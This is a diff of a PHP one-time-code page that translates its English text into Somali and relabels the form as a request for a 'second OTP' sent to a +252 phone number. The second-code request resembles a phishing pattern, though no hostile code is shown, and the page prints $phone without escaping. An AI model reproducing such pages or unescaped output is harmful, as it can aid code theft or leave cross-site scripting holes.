@@ -1,6 +1,6 @@
 <?php
 if (isset($_GET['error'])) {
-    echo "<p style='color:red;'>Invalid code, please try again❌</p>";
+    echo "<p style='color:red;'>Koodh khaldan,fadlan mar kale isku day❌</p>";
 }
 ?>
 <?php
@@ -30,9 +30,9 @@ if(empty($phone)){
 
 <div class="card">
 
-<h2>Xaqiijinta OTP-ga</h2>
+<h2>Xaqiijinta OTP-ga Labaad</h2>
 
-<p>please verify your second otp</p>
+<p>Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga</p>
 
 <h3>+252 <?php echo $phone; ?></h3>
 
@@ -50,10 +50,10 @@ if(empty($phone)){
     <input type="text" maxlength="1" name="d6">
 </div>
 
-<button type="submit">Verify</button>
-<p id="timer">Resend OTP in 30s</p>
+<button type="submit">XAQIIJI OTP-GA LABAAD</button>
+<p id="timer">resend otp in 30s</p>
 
-<button id="resendBtn" disabled>Resend OTP</button>
+<button id="resendBtn" disabled>resend otp</button>
 
 </form>
 
